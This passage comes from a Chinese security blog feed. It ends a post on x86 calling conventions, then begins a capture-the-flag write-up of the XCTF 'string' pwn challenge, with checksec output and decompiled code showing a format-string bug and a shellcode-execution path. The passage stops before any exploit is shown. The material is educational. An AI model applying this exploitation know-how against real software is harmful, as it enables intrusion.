;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">    __asm mov eax, a</span><br><span class="line">    __asm add eax, b</span><br><span class="line">    __asm ret <span class="number">8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，__declspec是微软关键字，其他系统上可能没有。</p></blockquote><h4 id="六、pascal调用约定"><a href="#六、pascal调用约定" class="headerlink" title="六、pascal调用约定"></a><code>六、pascal调用约定</code></h4><blockquote><p>Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p><br>Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p></blockquote><h3 id="0x01-调用约定的主要特点"><a href="#0x01-调用约定的主要特点" class="headerlink" title="0x01 调用约定的主要特点"></a><font color="navy">0x01 调用约定的主要特点</font></h3><p><img src="/images/121-1.jpg" alt></p><blockquote><p>Windows下可直接在函数声明前添加关键字<strong>stdcall、</strong>cdecl或<strong>fastcall等标识确定函数的调用方式，如int </strong>stdcall func()。Linux下可借用函数attribute 机制，如int <strong>attribute</strong>((<strong>stdcall</strong>)) func()。</p><p><br>代码示例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</span><br><span class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line">    <span class="keyword">return</span> i+j+k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CallerFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p></blockquote><p><img src="/images/121-2.png" alt></p><h3 id="0x02-【扩展】可变参数函数支持条件"><a href="#0x02-【扩展】可变参数函数支持条件" class="headerlink" title="0x02 【扩展】可变参数函数支持条件"></a><font color="navy">0x02 【扩展】可变参数函数支持条件</font></h3><blockquote><font color="red">**若要支持可变参数的函数，则参数应自右向左进栈，并且由主调函数负责清除栈中的参数(参数出栈)。**</font><ul><li><p>首先，参数按照从右向左的顺序压栈，则参数列表最左边(第一个)的参数最接近栈顶位置。所有参数距离帧基指针的偏移量都是常数，而不必关心已入栈的参数数目。只要不定的参数的数目能根据第一个已明确的参数确定，就可使用不定参数。例如printf函数，第一个参数即格式化字符串可作为后继参数指示符。通过它们就可得到后续参数的类型和个数，进而知道所有参数的尺寸。当传递的参数过多时，以帧基指针为基准，获取适当数目的参数，其他忽略即可。若函数参数自左向右进栈，则第一个参数距离栈帧指针的偏移量与已入栈的参数数目有关，需要计算所有参数占用的空间后才能精确定位。当实际传入的参数数目与函数期望接受的参数数目不同时，偏移量计算会出错！</p></li><li><p>其次，调用函数将参数压栈，只有它才知道栈中的参数数目和尺寸，因此调用函数可安全地清栈。而被调函数永远也不能事先知道将要传入函数的参数信息，难以对栈顶指针进行调整。</p></li></ul><p>C++为兼容C，仍然支持函数带有可变的参数。但在C++中更好的选择常常是函数多态。</p></blockquote><h3 id="0x03-转载来源"><a href="#0x03-转载来源" class="headerlink" title="0x03 转载来源"></a><font color="navy">0x03 转载来源</font></h3><p> <a href="https://www.cnblogs.com/clover-toeic/p/3756668.html" target="_blank" rel="noopener">C语言函数调用栈(二)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-常见的调用约定&quot;&gt;&lt;a href=&quot;#0x00-常见的调用约定&quot; class=&quot;headerlink&quot; title=&quot;0x00 常见的调用约定&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;0x00 常见的调用约定&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】由浅入深的剖析 &quot;string&quot; 题目</title>
    <link href="https://muzibing.github.io/2020/05/30/2020.05.30%EF%BC%88120%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/30/2020.05.30（120）/</id>
    <published>2020-05-29T16:00:00.000Z</published>
    <updated>2020-06-13T00:20:29.651Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-前言font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-前言font"></a> <font color="navy"><code>0x00 前言</code></font></h3><p>      在上一篇“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”中已经很详细的阐述格式化字符串漏洞的原理以及如何构造payload，并且用例子进一步的说明了格式化字符串漏洞的危害，今天我们就以XCTF中的<code>string</code>题目为例，再次感受一下格式化字符串漏洞的实际危害。在写这篇文章之前，我已经在网上查了相关的writeup，虽然很多人将这道题目解了出来，并写了相关的writeup发在网上，但是我在看这些文章时，发现这些文章中存在着很多问题以及表述不正确的地方，今天我准备系统的写一下这道题目的writeup，具体的细节就不会一一赘述，如果想了解格式化字符串更多细节，请阅读“<a href="https://muzibing.github.io/2020/05/29/2020.05.29%EF%BC%88119%EF%BC%89">详解格式化字符串漏洞</a>”。</p><h3 id="font-color-navy0x01-题目分析font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-题目分析font"></a> <font color="navy"><code>0x01 题目分析</code></font></h3><h4 id="1查看-elf-文件"><a class="markdownIt-Anchor" href="#1查看-elf-文件"></a> <code>1.查看 ELF 文件</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br></pre></td></tr></table></figure><blockquote><p>从上述信息可以看出<code>pwn</code>是一个x86-64位的ELF文件</p></blockquote><h4 id="2查看文件保护机制"><a class="markdownIt-Anchor" href="#2查看文件保护机制"></a> <code>2.查看文件保护机制</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/string/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>从上述信息中可以看出：</p><ul><li><code>pwn</code>文件的结构<code>amd64-64-little</code>，</li><li>GOT表不可写</li><li>有金丝雀，开启了栈保护，因此无法用实现栈溢出</li><li>栈不可执行</li><li>没有开启地址随机化</li></ul></blockquote><h4 id="3用-ida-逆向"><a class="markdownIt-Anchor" href="#3用-ida-逆向"></a> <code>3.用 IDA 逆向</code></h4><blockquote><p>下面我将 IDA 逆向的结果放在一起：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">// main函数</span><br><span class="line">// 内部含有的函数：sub_400D72(v5);</span><br><span class="line">// 功能：打印v5的地址</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // ST88_8@1</span><br><span class="line">  _DWORD *v4; // rax@1</span><br><span class="line">  __int64 v5; // ST18_8@1</span><br><span class="line">  __int64 result; // rax@1</span><br><span class="line">  __int64 v7; // rdx@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_400996(60LL, 0LL);</span><br><span class="line">  v4 = malloc(8uLL);</span><br><span class="line">  v5 = (__int64)v4;</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br><span class="line">  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);</span><br><span class="line">  puts(&quot;we will tell you two secret ...&quot;);</span><br><span class="line">  printf(&quot;secret[0] is %x\n&quot;, v5, a2);</span><br><span class="line">  printf(&quot;secret[1] is %x\n&quot;, v5 + 4);</span><br><span class="line">  puts(&quot;do not tell anyone &quot;);</span><br><span class="line">  sub_400D72(v5);</span><br><span class="line">  puts(&quot;The End.....Really?&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400D72(v5);</span><br><span class="line">// 内部含有的函数：sub_400A7D(&quot;Creating a new player.&quot;);sub_400BB9();sub_400CA6(a1);</span><br><span class="line">// 功能：创建角色名称，长度不能超过13</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400D72(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [sp+10h] [bp-20h]@1</span><br><span class="line">  __int64 v3; // [sp+28h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;What should your character&apos;s name be:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%s&quot;, &amp;s);</span><br><span class="line">  if ( strlen(&amp;s) &lt;= 0xC )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Creating a new player.&quot;);</span><br><span class="line">    sub_400A7D();</span><br><span class="line">    sub_400BB9();</span><br><span class="line">    sub_400CA6(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Hei! What&apos;s up!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400A7D();</span><br><span class="line">// 内部包含的函数：sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">// 功能：要求输入“east”才可进行下一步</span><br><span class="line"></span><br><span class="line">__int64 sub_400A7D()</span><br><span class="line">&#123;</span><br><span class="line">  char s1; // [sp+0h] [bp-10h]@2</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v2 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot; This is a famous but quite unusual inn. The air is fresh and the&quot;);</span><br><span class="line">  puts(&quot;marble-tiled ground is clean. Few rowdy guests can be seen, and the&quot;);</span><br><span class="line">  puts(&quot;furniture looks undamaged by brawls, which are very common in other pubs&quot;);</span><br><span class="line">  puts(&quot;all around the world. The decoration looks extremely valuable and would fit&quot;);</span><br><span class="line">  puts(&quot;into a palace, but in this city it&apos;s quite ordinary. In the middle of the&quot;);</span><br><span class="line">  puts(&quot;room are velvet covered chairs and benches, which surround large oaken&quot;);</span><br><span class="line">  puts(&quot;tables. A large sign is fixed to the northern wall behind a wooden bar. In&quot;);</span><br><span class="line">  puts(&quot;one corner you notice a fireplace.&quot;);</span><br><span class="line">  puts(&quot;There are two obvious exits: east, up.&quot;);</span><br><span class="line">  puts(&quot;But strange thing is ,no one there.&quot;);</span><br><span class="line">  puts(&quot;So, where you will go?east or up?:&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;s1);</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;east&quot;) || !strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;hei! I&apos;m secious!&quot;);</span><br><span class="line">    puts(&quot;So, where you will go?:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( strcmp(&amp;s1, &quot;east&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s1, &quot;up&quot;) )</span><br><span class="line">      sub_4009DD(&amp;s1, &quot;up&quot;);</span><br><span class="line">    puts(&quot;YOU KNOW WHAT YOU DO?&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_4009DD();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// </span><br><span class="line"></span><br><span class="line">void __noreturn sub_4009DD()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // eax@1</span><br><span class="line">  int v1; // eax@2</span><br><span class="line">  int v2; // [sp+0h] [bp-10h]@2</span><br><span class="line">  unsigned int v3; // [sp+4h] [bp-Ch]@2</span><br><span class="line">  __int64 v4; // [sp+8h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;You go right, suddenly, a big hole appear front you!&quot;);</span><br><span class="line">  puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  v0 = time(0LL);</span><br><span class="line">  srand(v0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = rand();</span><br><span class="line">    v3 = ((((unsigned int)v1 &gt;&gt; 31) + (_BYTE)v1) &amp; 1) - ((unsigned int)v1 &gt;&gt; 31);</span><br><span class="line">    _isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">    if ( v2 != v3 )</span><br><span class="line">      break;</span><br><span class="line">    puts(&quot;You escape it!but another hole appear!&quot;);</span><br><span class="line">    puts(&quot;where you will go?!left(0) or right(1)?!:&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;YOU ARE DEAD&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400BB9();</span><br><span class="line">// 内部包含的函数：*</span><br><span class="line">// 功能：输入一个地址、wish（存在格式化漏洞）</span><br><span class="line"></span><br><span class="line">__int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-7Ch]@1</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-78h]@1</span><br><span class="line">  char format; // [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v4; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">// sub_400CA6(a1);</span><br><span class="line">// 内部包含的函数：mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">// 功能：当满足*(_DWORD *)a1 == *(_DWORD *)(a1 + 4) 条件的时候，可以直接输入shellcode，执行我们需要的代码</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_400CA6(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi@2</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    read(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">////////////////////////////////////////////////////////////////////////////////////////////////////////////</span><br></pre></td></tr></table></figure><blockquote><p>为了更加清楚的表示出各个函数之间的关系，我将上面的函数包含关系做了一个示意图，如下：</p></blockquote><p><img src="/images/120-1.png" alt></p><blockquote><p>从上面的图中可以得出这样的结论：</p><ul><li><p>要想使程序执行shellcode就需要使<code>*(_DWORD *)a1 == *(_DWORD *)(a1 + 4)</code>条件成立</p></li><li><p>该程序一共有 <code>5</code> 处输入，要想程序成功执行shellcode，其中前三个输入被要求为：</p><ul><li><code>What should your character's name be:</code> 要求长度不超过13的字符串</li><li><code>So, where you will go?east or up?:</code> 要求输入<code>east</code></li><li><code>go into there(1), or leave(0)?:</code> 要求输入<code>1</code>’</li></ul><p>其中后面两个输入都可以被利用，后面会一一进行讲解</p><ul><li>在第<code>5</code>个输入后有一个printf的格式化字符串漏洞</li></ul></li></ul><p>目前上述信息是通过IDA逆向后能到的信息，下面我们简单的运行一下该程序</p></blockquote><p><code>知识点1：mmap();函数</code><sup>[1]</sup></p><p>      当创建一个或者切换一个进程的同时，会把属于这个当前进程的系统信息载入。这些系统信息中包含了当前进程的运行空间。当用户程序调用mmap后。函数会在当前进程的空间中找到适合的vma来描述自己将要映射的区域。这个区域的作用就是将mmap函数中文件描述符所指向的具体文件中内容映射过来。</p><p>      原理是mmap的执行，仅仅是在内核中建立了文件与虚拟内存空间的对应关系。用户访问这些虚拟内存空间时，页面表里面是没有这些空间的表项的。当用户程序试图访问这些映射的空间时，于是产生缺页异常。内核捕捉这些异常，逐渐将文件载入。所谓的载入过程，具体的操作就是read和write在管理pagecache。Vma的结构体中有很文件操作集。vma操作集中会有自己关于page cache的操作集合。这样，虽然是两种不同的系统调用，由于操作和调用触发的路径不同。但是最后还是落实到了page cache的管理。实现了文件内容的操作。</p><h4 id="4运行-pwn"><a class="markdownIt-Anchor" href="#4运行-pwn"></a> <code>4.运行 pwn</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Dragon Games!</span><br><span class="line">                                                 .~)&gt;&gt;</span><br><span class="line">                                               .~))))&gt;&gt;&gt;</span><br><span class="line">                                             .~))&gt;&gt;             ___\</span><br><span class="line">                                           .~))&gt;&gt;)))&gt;&gt;      .-~))&gt;&gt;\</span><br><span class="line">                                         .~)))))&gt;&gt;       .-~))&gt;&gt;)&gt;   </span><br><span class="line">                                       .~)))&gt;&gt;))))&gt;&gt;  .-~)&gt;&gt;)&gt;       </span><br><span class="line">                   )                 .~))&gt;&gt;))))&gt;&gt;  .-~)))))&gt;&gt;)&gt;</span><br><span class="line">                ( )@@*)             //)&gt;))))))  .-~))))&gt;&gt;)&gt;</span><br><span class="line">              ).@(@@               //))&gt;&gt;))) .-~))&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">            (( @.@).              //))))) .-~)&gt;&gt;)))))&gt;&gt;)&gt;</span><br><span class="line">          ))  )@@*.@@ )          //)&gt;))) //))))))&gt;&gt;))))&gt;&gt;)&gt;</span><br><span class="line">       ((  ((@@@.@@             |/))))) //)))))&gt;&gt;)))&gt;&gt;)&gt;</span><br><span class="line">      )) @@*. )@@ )   (\_(\  |))&gt;)) //)))&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">    (( @@@(.@(@ .    _/`-`  ~|b |&gt;))) //)&gt;&gt;)))))))&gt;&gt;)&gt;</span><br><span class="line">     )* @@@ )@*     (@) (@)  |))) //))))))&gt;&gt;))))&gt;&gt;</span><br><span class="line">   (( @. )@( @ .   _/       / )) //))&gt;&gt;)))))&gt;&gt;&gt;_._</span><br><span class="line">    )@@ (@@*)@@.  (6,   6) / ^ )//))))))&gt;&gt;)))&gt;&gt;   ~~-.</span><br><span class="line"> ( @jgs@@. @@@.*@_ ~^~^~, /\  ^ /)&gt;&gt;))))&gt;&gt;      _.     `,</span><br><span class="line">  ((@@ @@@*.(@@ .   \^^^/&apos; (  ^  )))&gt;&gt;        .&apos;         `,</span><br><span class="line">   ((@@).*@@ )@ )    `-&apos;   ((   ^  ~)_          /             `,</span><br><span class="line">     (@@. (@@ ).           (((   ^    `\        |               `.</span><br><span class="line">       (*.@*              / ((((        \        \      .         `.</span><br><span class="line">                         /   (((((  \    \    _.-~\     Y,         ;</span><br><span class="line">                        /   / (((((( \    \.-~   _.`&quot; _.-~`,       ;</span><br><span class="line">                       /   /   `(((((()    )    (((((~      `,     ;</span><br><span class="line">                     _/  _/      `&quot;&quot;&quot;/   /&apos;                  ;     ;</span><br><span class="line">                 _.-~_.-~           /  /&apos;                _.-~   _.&apos;</span><br><span class="line">               ((((~~              / /&apos;              _.-~ __.--~</span><br><span class="line">                                  ((((          __.-~ _.-~</span><br><span class="line">                                              .&apos;   .~~</span><br><span class="line">                                              :    ,&apos;</span><br><span class="line"></span><br><span class="line">we are 